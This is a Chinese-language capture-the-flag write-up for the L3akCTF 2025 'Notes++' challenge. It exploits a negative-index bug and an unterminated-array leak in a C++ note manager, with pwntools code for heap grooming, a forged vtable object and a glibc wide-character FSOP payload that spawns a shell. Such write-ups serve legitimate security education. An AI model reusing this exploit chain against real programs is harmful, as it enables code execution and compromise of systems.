# L3akCTF 2025 Notes++ Writeup

## 题目简述

Notes++ 是一个 C++ 多态笔记管理器，提供 `RandomNote`、`FixedNote` 和 `DynamicNote` 三种对象。题目的主要漏洞有两处：

1. 索引只检查 `index < notes.size()`，没有拒绝负数，可在 `std::vector` 起点之前取出伪造的 `Note *`；
2. `FixedNote` 的 40 字节数组未初始化，写入时也不补 NUL，随后却按 C 字符串输出，可越界泄漏堆内容。

通过堆布局整理，可以先从未终止的 `FixedNote` 泄漏 libc 与 PIE，再让负索引把一段可控 `std::string` 内容解释成伪造的 `DynamicNote`。虚调用最终把输入写到 `_IO_2_1_stdout_`，用 wide-character FSOP 劫持为 `system(" sh")`。

## 解题过程

### 确认索引与字符串漏洞

设置、显示和删除功能都使用类似检查：

```cpp
int index;
std::cin >> index;

if (index < std::ssize(notes)) {
    notes[index]->setContent();
}
```

当 `index=-35` 时，比较仍成立。`vector::operator[]` 的下标最终按无符号偏移参与指针运算，在本题编译结果中会访问 `notes` 动态数组之前的堆内存。

`FixedNote` 则定义为：

```cpp
std::array<char, 40> buffer;
```

构造函数没有初始化它，`setContent()` 只复制最多 40 字节：

```cpp
std::size_t len = std::min(input.size(), buffer.size());
std::copy_n(input.begin(), len, buffer.begin());
```

`displayContent()` 却执行：

```cpp
std::cout << buffer.data();
```

如果可控内容后没有 NUL，输出会继续读取对象后的旧堆数据。

二进制启用了 Full RELRO、stack canary、NX 和 PIE，因此信息泄漏是后续 FSOP 的必要前提。

### 整理堆并制造泄漏

先创建 9 个 `RandomNote` 并初始化，再全部删除：

```python
for i in range(9):
    create(1)
    setnote(i)

for _ in range(9):
    delete(0)
```

对应大小的 tcache 最多保存 7 个 chunk，多出的 2 个进入 fastbin。然后创建一个 `DynamicNote`，令其字符串分配超大缓冲区：

```python
create(3)
setnotecontent(0, b"A" * 0x10000)
```

这次大分配会触发 fastbin consolidation。再创建 `FixedNote` 时，其未初始化数组复用了带有 allocator 元数据和旧指针的区域：

```python
create(2)
display(1)

setnotecontent(1, b"A" * 8)
display(1)
```

根据仓库所附 exploit 的输出布局，第一个未初始化字符串给出 libc 指针，第二次在 8 个 `A` 后给出 PIE 指针：

```python
io.recvuntil(b"Note content: ")
libc_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = libc_leak - 0x203b50

io.recvuntil(b"A" * 8)
pie_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
exe.address = (pie_leak - 0x5275) & ~0xfff
```

`0x203b50` 和 `0x5275` 均与题目容器中的 glibc、libstdc++ 和具体编译结果绑定。

### 在字符串缓冲区中伪造 DynamicNote

`DynamicNote` 的对象布局可以抽象为：

```text
+0x00  vptr
+0x08  std::string data pointer
+0x10  std::string length
+0x18  std::string capacity
```

把下面 32 字节写入第 0 个动态笔记的大字符串缓冲区：

```python
fake_note = flat(
    exe.address + 0x8ca0,             # DynamicNote vtable address point
    libc.sym["_IO_2_1_stdout_"],      # fake string data
    0x1000,                           # length
    0x2000,                           # capacity
)
setnotecontent(0, fake_note)
```

堆整理后，`notes[-35]` 读到的恰好是原 `std::string` 的数据指针，因此它把上述字符串内容当成一个 `Note` 对象。伪造 vptr 使虚调用进入 `DynamicNote::setContent()`；该方法内部的 `std::getline()` 又把 fake string 的 data pointer 当作写入目标，于是下一行输入会直接覆盖 `stdout`。

### 构造 wide-character FSOP

官方 exploit 使用 pwntools `FileStructure` 生成基础对象：

```python
def build_fsop(stdout_addr):
    fp = FileStructure(null=stdout_addr + 0x68)
    fp.flags = 0x687320
    fp._IO_read_ptr = 0
    fp._IO_write_base = 0
    fp._IO_write_ptr = 1
    fp._wide_data = stdout_addr - 0x10

    payload = bytes(fp)
    payload = (
        payload[:0xc8]
        + p64(libc.sym["system"])
        + p64(stdout_addr + 0x60)
        + p64(libc.sym["_IO_wfile_jumps"])
    )
    return payload
```

其中：

- `_IO_write_ptr > _IO_write_base` 让刷新路径认为有数据待处理；
- 主 vtable 指向合法的 `_IO_wfile_jumps`，绕过 vtable 合法性检查；
- `_wide_data=stdout-0x10` 使 wide vtable 指针从 `stdout+0xd0` 取得；
- `stdout+0xd0` 被设为 `stdout+0x60`，而该伪 wide vtable 的函数槽 `+0x68` 正好落在 `stdout+0xc8`；
- `stdout+0xc8` 保存 `system`；
- `flags=0x687320` 的低字节按小端排列为 `" sh\x00"`，因此虚调用以伪造 FILE 指针作为首参数时，等价于 `system(" sh")`。

最后通过负索引触发 fake `DynamicNote::setContent()`：

```python
setnote(-35)
io.sendline(build_fsop(libc.sym["_IO_2_1_stdout_"]))
io.interactive()
```

下一次 `stdout` 刷新进入伪造的 wide-file 调用链，获得 shell。读取：

```bash
cat flag.txt
```

得到：

```text
L3AK{cl4n6_cf1_15_m057ly_600d}
```

## 方法总结

本题的利用链为“负索引 OOB + 未初始化且未终止的固定数组泄漏 + 堆布局控制 + 伪造多态对象 + fake `std::string` 任意写 + glibc wide FSOP”。C++ 容器和字符串提高了抽象层次，但不会自动修复错误的边界判断或对象布局滥用。

复现时最容易踩坑的是版本差异：负索引数值、泄漏偏移、vtable 地址、`stdout` 布局和 `_IO_wfile_jumps` 链都依赖题目容器。应先用同版本环境确认 chunk 大小和对象字段，再使用官方偏移；不能把某个 glibc 版本的 FSOP 模板当作跨版本固定公式。
